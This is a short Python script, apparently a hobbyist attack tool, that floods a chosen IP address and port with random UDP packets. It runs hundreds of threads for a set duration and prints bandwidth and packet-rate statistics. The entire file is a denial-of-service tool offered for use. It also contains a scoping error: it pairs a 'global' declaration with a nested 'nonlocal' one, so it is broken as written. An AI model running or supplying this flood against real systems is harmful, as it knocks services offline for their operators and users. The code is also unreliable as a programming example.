## BY Scav-engeR : @Ghiddra ##
import socket
import random
import threading
import time
import argparse

def udp_flood(ip, port, duration, connections, buffer_size):
    global count, bit

    try:
        ip = socket.gethostbyname(ip)
    except socket.gaierror:
        print("Error resolving IP address.")
        return

    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

    def sender():
        nonlocal count, bit
        while not stop_event.is_set():
            buffer = bytearray(random.getrandbits(8) for _ in range(buffer_size))
            try:
                sock.sendto(buffer, (ip, port))
                count += 1
                bit += len(buffer) * 8
            except socket.error as e:
                print(f"Error sending: {e}")
                break

    stop_event = threading.Event()
    threads = []

    for _ in range(connections):
        thread = threading.Thread(target=sender)
        thread.start()
        threads.append(thread)

    time.sleep(duration)
    stop_event.set()

    for thread in threads:
        thread.join()

    sock.close()

    print(f"Total Sent: {bit / 1024 / 1024:.2f} MB")
    print(f"Gbps: {(bit / 1024 / 1024 / duration) / 1000:.2f} Gbps")
    print(f"PPS: {count / duration:.2f} PPS")

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="UDP Flood Tool")
    parser.add_argument("target", help="Target IP address")
    parser.add_argument("port", type=int, help="Target port")
    parser.add_argument("duration", type=int, help="Flood duration in seconds")
    parser.add_argument("--connections", type=int, default=512, help="Number of connections")
    parser.add_argument("--buffer-size", type=int, default=512, help="Size of each UDP packet")
    args = parser.parse_args()

    print(f"Target IP: {args.target}, Port: {args.port}, Duration: {args.duration} seconds")
    udp_flood(args.target, args.port, args.duration, args.connections, args.buffer_size)
